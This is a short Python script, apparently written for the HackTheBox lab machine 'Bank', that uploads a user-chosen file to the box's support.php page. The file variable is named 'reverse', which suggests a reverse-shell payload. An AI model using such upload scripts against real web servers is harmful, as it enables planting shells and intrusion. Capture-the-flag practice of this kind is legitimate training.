#!/usr/bin/env python3

## Created by 0xd4y
## Script made for uploading files for exploting Bank on HackTheBox

import requests
import time

file_input = input("Please specify the path to the file you'd like to uplaod: ")
reverse = open(file_input,"rb")
url = "http://bank.htb/support.php"
data = {"submitadd":"submit"}

upload = requests.post(url, files= {"fileToUpload":reverse}, allow_redirects=False, data=data)
if ("successfully" in upload.text):
    print("Upload completed successfully!")
else:
    print("Something went wrong!")
    time.sleep(1)
    print(upload.text)
